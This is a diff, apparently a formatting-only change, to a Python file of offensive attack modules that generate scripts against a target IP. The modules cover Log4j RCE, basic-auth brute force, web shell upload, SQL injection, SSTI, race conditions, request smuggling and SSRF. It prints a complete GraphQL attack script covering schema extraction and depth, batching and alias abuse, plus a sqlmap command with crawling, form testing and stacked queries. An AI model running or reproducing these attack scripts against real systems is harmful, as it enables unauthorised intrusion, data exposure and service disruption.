@@ -16,10 +16,24 @@ class Log4jRCE(AttackModule):
     # Phase 3: version-gated -- Log4j 2.0-beta9 through 2.14.1 (2.15.0 still
     # vulnerable to CVE-2021-45046).
     target_versions = {
-        "http": ["log4j 2.0", "log4j 2.1", "log4j 2.2", "log4j 2.3", "log4j 2.4",
-                 "log4j 2.5", "log4j 2.6", "log4j 2.7", "log4j 2.8", "log4j 2.9",
-                 "log4j 2.10", "log4j 2.11", "log4j 2.12", "log4j 2.13", "log4j 2.14",
-                 "log4j 2.15"],
+        "http": [
+            "log4j 2.0",
+            "log4j 2.1",
+            "log4j 2.2",
+            "log4j 2.3",
+            "log4j 2.4",
+            "log4j 2.5",
+            "log4j 2.6",
+            "log4j 2.7",
+            "log4j 2.8",
+            "log4j 2.9",
+            "log4j 2.10",
+            "log4j 2.11",
+            "log4j 2.12",
+            "log4j 2.13",
+            "log4j 2.14",
+            "log4j 2.15",
+        ],
         "https": ["log4j 2.0", "log4j 2.14", "log4j 2.15"],
     }
     # Capability metadata: remote RCE primitive -- a confirmed JNDI callback is
@@ -81,6 +95,7 @@ print(s.recv(4096).decode(errors="replace"))
 s.close()
 """
 
+
 class BasicAuthBuster(AttackModule):
     name = "BasicAuthBuster"
     description = "Brute-force HTTP Basic Auth with small default wordlist"
@@ -127,6 +142,7 @@ for u,p in creds:
         pass
 """
 
+
 class APIFuzzer(AttackModule):
     name = "APIFuzzer"
     description = "Fuzz common REST API endpoints for information disclosure or injection"
@@ -170,6 +186,7 @@ for p in paths:
     except Exception:
         pass
 """
+
 
 class WebShellUpload(AttackModule):
     name = "WebShellUpload"
@@ -244,6 +261,7 @@ for filename, content, ctype in shells:
         print(f"{{filename}} failed: {{e}}")
 """
 
+
 class SQLInjection(AttackModule):
     name = "SQLInjection"
     description = "Automated SQL injection testing with sqlmap integration"
@@ -274,11 +292,11 @@ class SQLInjection(AttackModule):
                 "https://owasp.org/www-community/attacks/SQL_Injection",
             ],
             suggested_command=(
-                f"sqlmap -u 'http://{ctx.target_ip}/page.php?id=1' --batch --crawl=2 "
-                f"--forms --level=3 --risk=2"
+                f"sqlmap -u 'http://{ctx.target_ip}/page.php?id=1' --batch --crawl=2 --forms --level=3 --risk=2"
             ),
             techniques=["union", "error", "time", "stacked"],
         )
+
 
 class XSSScanner(AttackModule):
     name = "XSSScanner"
@@ -343,6 +361,7 @@ for payload in payloads:
 # ---------------------------------------------------------------------------
 # Credential Operations
 # ---------------------------------------------------------------------------
+
 
 class SSTIProbe(AttackModule):
     name = "SSTIProbe"
@@ -454,6 +473,7 @@ else:
     print("\\n[-] No SSTI detected on common endpoints.")
 '''
 
+
 class GraphQLIntrospect(AttackModule):
     name = "GraphQLIntrospect"
     description = "GraphQL schema extraction, query depth abuse, batching attacks, and introspection"
@@ -486,38 +506,38 @@ class GraphQLIntrospect(AttackModule):
         target = ctx.target_ip
         return (
             '"""GraphQL Introspection & Attack Toolkit."""\n'
-            'import json, sys, urllib.request, urllib.error\n'
-            '\n'
+            "import json, sys, urllib.request, urllib.error\n"
+            "\n"
             f'TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target}"\n'
-            'PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80\n'
+            "PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80\n"
             'SCHEME = "https" if PORT in (443, 8443) else "http"\n'
             'BASE = f"{SCHEME}://{TARGET}:{PORT}"\n'
-            '\n'
+            "\n"
             'INTROSPECTION_QUERY = """\n'
-            'query IntrospectionQuery {\n'
-            '  __schema {\n'
-            '    queryType { name }\n'
-            '    mutationType { name }\n'
-            '    subscriptionType { name }\n'
-            '    types {\n'
-            '      name kind description\n'
-            '      fields { name description type { name kind ofType { name kind } } args { name description type { name kind } } }\n'
-            '      inputFields { name description type { name kind } }\n'
-            '      enumValues { name description }\n'
-            '    }\n'
-            '    directives { name description locations args { name description type { name kind } } }\n'
-            '  }\n'
-            '}\n'
+            "query IntrospectionQuery {\n"
+            "  __schema {\n"
+            "    queryType { name }\n"
+            "    mutationType { name }\n"
+            "    subscriptionType { name }\n"
+            "    types {\n"
+            "      name kind description\n"
+            "      fields { name description type { name kind ofType { name kind } } args { name description type { name kind } } }\n"
+            "      inputFields { name description type { name kind } }\n"
+            "      enumValues { name description }\n"
+            "    }\n"
+            "    directives { name description locations args { name description type { name kind } } }\n"
+            "  }\n"
+            "}\n"
             '"""\n'
-            '\n'
+            "\n"
             'DEPTH_ATTACK_QUERY = """\n'
-            'query DeepQuery {\n'
-            '  level0: __typename\n'
-            '  {nested}\n'
-            '}\n'
+            "query DeepQuery {\n"
+            "  level0: __typename\n"
+            "  {nested}\n"
+            "}\n"
             '"""\n'
-            '\n'
-            'BATCH_ATTACK = [\n'
+            "\n"
+            "BATCH_ATTACK = [\n"
             '    {"query": "{ __typename }"},\n'
             '    {"query": "{ __typename }"},\n'
             '    {"query": "{ __typename }"},\n'
@@ -528,48 +548,48 @@ class GraphQLIntrospect(AttackModule):
             '    {"query": "{ __typename }"},\n'
             '    {"query": "{ __typename }"},\n'
             '    {"query": "{ __typename }"},\n'
-            ']\n'
-            '\n'
+            "]\n"
+            "\n"
             'ALIAS_ATTACK = "query AliasedQuery { " + " ".join(f"a{i}: __typename" for i in range(100)) + " }"\n'
-            '\n'
-            'def graphql_request(endpoint, query):\n'
+            "\n"
+            "def graphql_request(endpoint, query):\n"
             '    """Send a GraphQL request and return parsed response."""\n'
-            '    if isinstance(query, str):\n'
+            "    if isinstance(query, str):\n"
             '        payload = {"query": query}\n'
-            '    elif isinstance(query, list):\n'
-            '        payload = query\n'
-            '    else:\n'
-            '        payload = query\n'
-            '    data = json.dumps(payload).encode()\n'
-            '    try:\n'
+            "    elif isinstance(query, list):\n"
+            "        payload = query\n"
+            "    else:\n"
+            "        payload = query\n"
+            "    data = json.dumps(payload).encode()\n"
+            "    try:\n"
             '        req = urllib.request.Request(endpoint, data=data, headers={"Content-Type": "application/json"}, method="POST")\n'
-            '        with urllib.request.urlopen(req, timeout=15) as resp:\n'
-            '            return json.loads(resp.read().decode())\n'
-            '    except urllib.error.HTTPError as e:\n'
+            "        with urllib.request.urlopen(req, timeout=15) as resp:\n"
+            "            return json.loads(resp.read().decode())\n"
+            "    except urllib.error.HTTPError as e:\n"
             '        return {"error": e.code, "body": e.read().decode(errors="replace")[:500]}\n'
-            '    except Exception as e:\n'
+            "    except Exception as e:\n"
             '        return {"error": str(e)}\n'
-            '\n'
+            "\n"
             'graphql_endpoints = ["/graphql", "/gql", "/api/graphql", "/v1/graphql", "/query", "/graphiql"]\n'
-            'found_endpoint = None\n'
-            'for ep in graphql_endpoints:\n'
+            "found_endpoint = None\n"
+            "for ep in graphql_endpoints:\n"
             '    url = f"{BASE}{ep}"\n'
             '    result = graphql_request(url, "{ __typename }")\n'
             '    if "data" in result and "__typename" in str(result.get("data", {})):\n'
-            '        found_endpoint = url\n'
+            "        found_endpoint = url\n"
             '        print(f"[+] GraphQL endpoint found: {url}")\n'
-            '        break\n'
+            "        break\n"
             '    elif "error" not in result:\n'
             '        print(f"[?] Possible GraphQL at {url}: {json.dumps(result)[:200]}")\n'
-            '\n'
-            'if not found_endpoint:\n'
+            "\n"
+            "if not found_endpoint:\n"
             '    print("[-] No GraphQL endpoint found. Trying common paths anyway...")\n'
             '    found_endpoint = f"{BASE}/graphql"\n'
-            '\n'
+            "\n"
             'print(f"\\n=== Testing: {found_endpoint} ===\\n")\n'
-            '\n'
+            "\n"
             'print("[1] Schema Introspection...")\n'
-            'intro_result = graphql_request(found_endpoint, INTROSPECTION_QUERY)\n'
+            "intro_result = graphql_request(found_endpoint, INTROSPECTION_QUERY)\n"
             'if "data" in intro_result and intro_result["data"].get("__schema"):\n'
             '    schema = intro_result["data"]["__schema"]\n'
             '    types_count = len(schema.get("types", []))\n'
@@ -578,37 +598,37 @@ class GraphQLIntrospect(AttackModule):
             '        name = t.get("name", "?")\n'
             '        kind = t.get("kind", "?")\n'
             '        fields = [f.get("name", "?") for f in t.get("fields", [])[:5]] if t.get("fields") else []\n'
-            '        if fields:\n'
-            '            print(f"    {kind} {name}: {\', \'.join(fields)}")\n'
-            'else:\n'
+            "        if fields:\n"
+            "            print(f\"    {kind} {name}: {', '.join(fields)}\")\n"
+            "else:\n"
             '    print(f"  [-] Introspection disabled or blocked: {json.dumps(intro_result)[:200]}")\n'
-            '\n'
+            "\n"
             'print("\\n[2] Query Depth Attack...")\n'
-            'depth = 50\n'
+            "depth = 50\n"
             'nested = "\\n  ".join(f"level{i}: __typename {{ level{i+1}: __typename" for i in range(depth))\n'
             'nested += "\\n  " + "}" * depth\n'
             'depth_query = DEPTH_ATTACK_QUERY.replace("{nested}", nested)\n'
-            'depth_result = graphql_request(found_endpoint, depth_query)\n'
+            "depth_result = graphql_request(found_endpoint, depth_query)\n"
             'if "error" in str(depth_result).lower() or "depth" in str(depth_result).lower():\n'
             '    print(f"  [+] Depth limit enforced: {json.dumps(depth_result)[:300]}")\n'
-            'else:\n'
+            "else:\n"
             '    print(f"  [!] No depth limit detected ({depth} levels accepted)")\n'
-            '\n'
+            "\n"
             'print("\\n[3] Batching Attack (10 queries in one request)...")\n'
-            'batch_result = graphql_request(found_endpoint, BATCH_ATTACK)\n'
-            'if isinstance(batch_result, list) and len(batch_result) == 10:\n'
+            "batch_result = graphql_request(found_endpoint, BATCH_ATTACK)\n"
+            "if isinstance(batch_result, list) and len(batch_result) == 10:\n"
             '    print(f"  [+] Batching ENABLED! {len(batch_result)} responses returned.")\n'
-            'else:\n'
+            "else:\n"
             '    print(f"  [-] Batching blocked: {json.dumps(batch_result)[:200]}")\n'
-            '\n'
+            "\n"
             'print("\\n[4] Alias Attack (100 aliases)...")\n'
-            'alias_result = graphql_request(found_endpoint, ALIAS_ATTACK)\n'
+            "alias_result = graphql_request(found_endpoint, ALIAS_ATTACK)\n"
             'if "data" in alias_result:\n'
             '    count = len(alias_result.get("data", {}))\n'
             '    print(f"  [+] Alias attack accepted: {count} aliases processed")\n'
-            'else:\n'
+            "else:\n"
             '    print(f"  [-] Alias attack blocked: {json.dumps(alias_result)[:200]}")\n'
-            '\n'
+            "\n"
             'print("\\n[!] Use extracted schema to find sensitive queries, mutations, and IDOR vectors.")\n'
         )
 
@@ -617,9 +637,12 @@ class GraphQLIntrospect(AttackModule):
 # Race Condition & Timing Attack Modules
 # ---------------------------------------------------------------------------
 
+
 class RaceRequest(AttackModule):
     name = "RaceRequest"
-    description = "Send N concurrent requests to exploit TOCTOU race conditions (coupon reuse, limit bypass, double-spend)"
+    description = (
+        "Send N concurrent requests to exploit TOCTOU race conditions (coupon reuse, limit bypass, double-spend)"
+    )
     target_services = ["http", "https"]
     target_ports = [80, 443, 8080, 8443, 3000, 5000]
     required_cves = []
@@ -752,6 +775,7 @@ for tc in test_cases:
 
 print("\\n[!] For advanced race testing, use Turbo Intruder (Burp) or custom async scripts.")
 '''
+
 
 class TimingOracle(AttackModule):
     name = "TimingOracle"
@@ -896,6 +920,7 @@ else:
 
 print("\\n[!] Timing oracles can be exploited for blind data extraction (e.g., blind SQLi character-by-character).")
 '''
+
 
 class RequestSmuggling(AttackModule):
     name = "RequestSmuggling"
@@ -1056,6 +1081,7 @@ print("\\n[!] Confirmed smuggling can be used for cache poisoning, request hijac
 # ---------------------------------------------------------------------------
 # Server-Side Request Forgery / XML External Entity / Local File Inclusion
 # ---------------------------------------------------------------------------
+
 
 class SSRFProbe(AttackModule):
     name = "SSRFProbe"
@@ -1425,4 +1451,3 @@ print("\\n[!] Traversal targets the ctx.target_ip host filesystem only — no th
 # ---------------------------------------------------------------------------
 # Credential Attack Amplifier Modules
 # ---------------------------------------------------------------------------
-
